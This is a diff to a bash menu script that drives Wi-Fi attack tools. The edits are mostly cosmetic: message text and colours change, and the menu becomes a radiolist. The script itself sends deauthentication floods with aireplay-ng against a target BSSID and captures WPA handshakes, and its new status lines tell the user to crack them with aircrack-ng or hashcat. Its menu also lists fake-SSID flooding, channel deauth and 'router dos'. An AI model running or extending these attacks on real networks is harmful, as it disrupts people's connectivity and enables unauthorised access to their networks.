@@ -58,7 +58,7 @@ fi
 on () {
 echo -e "${B}${b}[*]${y}Turning on monitor mode...${s}"
 sudo xterm -e airmon-ng check kill
-echo -e "${B}${b}[*]${y}Try to make ${phy} interface down...${s}"
+echo -e "${B}${b}[*]${y}Trying to make ${phy} interface down...${s}"
 sleep 1
 sudo xterm -e ip link set ${phy} down 2>/dev/null
 echo -e "${B}${b}[*]${y}Turning on monitor mode...${s}"
@@ -75,18 +75,18 @@ echo -e "${B}${b}[*]${y}Turned on monitor mode successfully!!!${s}"
 
 #turn off monitor mode [2]
 off () {
-echo -e "${B}${b}[*]${r}turning off monitor mode...${s}"
+echo -e "${B}${b}[*]${y}turning off monitor mode...${s}"
 sleep 1
 sudo xterm -e ip link set wlan0mon up
 
-echo -e "${B}${b}[*]${r}turning interface mode managed from monitor...${s}"
+echo -e "${B}${b}[*]${y}turning interface mode managed from monitor...${s}"
 sleep 1
 sudo xterm -e iw dev wlan0mon set type managed
 
-echo -e "${B}${b}[*]${r}trying to restart NetworkManager...${s}"
+echo -e "${B}${b}[*]${y}trying to restart NetworkManager...${s}"
 sudo xterm -e service NetworkManager restart
 sleep 1
-echo -e "${B}${b}[*]${r}monitor mode turned off...${s}"
+echo -e "${B}${b}[*]${y}monitor mode turned off...${s}"
 }
 
 
@@ -273,7 +273,19 @@ sudo xterm -T "Trying to capture handshake | press (Ctrl + C) to stop " -e "/usr
 
 sudo xterm -T "Trying to deauthenticate users from the wifi" -e "/usr/sbin/aireplay-ng --deauth ${req} -D -a ${bssid} wlan0mon" &
 
+echo -e "${B}${b}[*]${y}Saving captured packet on a (cap) file..."
+
 sleep $req
+
+echo -e "${B}${b}[*]${y}Captured packets are stored in present directory..."
+
+sleep 1
+
+echo -e "${B}${b}[*]${y}Use aircrack-ng or hashcat to crack it..."
+
+sleep 1
+
+echo -e "${B}${b}[*] ${r}Happy Hunting..."
 
 sudo killall xterm
 
@@ -299,39 +311,39 @@ fi
 
 
 menu () {
-c=$(zenity --list --title="Network interface ${phy}" --text="Select an option" --column="numbers" --column="options" \
-1 "turn on monitor mode" \
-2 "turn off monitor mode" \
-3 "check injection" \
-4 "run airodump-ng" \
-5 "deauth wifi" \
-6 "deauth channel" \
-7 "create muliple fake SSID" \
-8 "capture handshake" \
-9 "router dos" \
-0 "exit" --width=600 --height=350)
+c=$(zenity --list --radiolist --title="Network interface ${phy}" --text="Select an option" --column="Select" --column="Menu Item" \
+FALSE "Turn on monitor mode" \
+FALSE "Turn off monitor mode" \
+FALSE "Check injection" \
+FALSE "Run airodump-ng" \
+FALSE "Deauth wifi" \
+FALSE "Deauth channel" \
+FALSE "Create muliple fake SSID" \
+FALSE "Capture handshake" \
+FALSE "Router dos" \
+FALSE "Exit" --width=600 --height=350)
 
-if [ "$c" == "1" ];
+if [ "$c" = "Turn on monitor mode" ];
 then
 on
 
 
-elif [ "$c" == "2" ];
+elif [ "$c" = "Turn off monitor mode" ];
 then
 off
 
 
-elif [ "$c" == "3" ];
+elif [ "$c" = "Check injection" ];
 then
 aireplay
 
 
-elif [ "$c" == "4" ];
+elif [ "$c" = "Run airodump-ng" ];
 then
 airodump_ask
 
 
-elif [ "$c" == "5" ];
+elif [ "$c" = "Deauth wifi" ];
 then
 r=$(zenity --info --title 'deauth wifi' --text 'Attack on a clients MAC address or directly BSSID?' --extra-button MAC --extra-button BSSID --ok-label back --width=400)
 
@@ -343,33 +355,33 @@ r=$(zenity --info --title 'deauth wifi' --text 'Attack on a clients MAC address 
 [ "$r" == "MAC" ] && kicks
 
 
-elif [ "$c" == "6" ];
+elif [ "$c" = "Deauth channel" ];
 then
 mdk
 
-elif [ "$c" == "7" ];
+elif [ "$c" = "Create muliple fake SSID" ];
 then
 mdk1
 
 
-elif [ "$c" == "8" ];
+elif [ "$c" == "Capture handshake" ];
 then
 handshake
 
 
-elif [ "$c" == "9" ];
+elif [ "$c" == "Router dos" ];
 then
 router
 
 
-elif [ "$c" == "0" ];
+elif [ "$c" == "Exit" ];
 then
 bye
 
 
 elif [ "$c" == "" ];
 then
-echo -e "${B}${y}[!]${r}Invalid input${s}"
+echo -e "\n${B}${y}[!]${r}Invalid input${s}"
 
 fi
 }
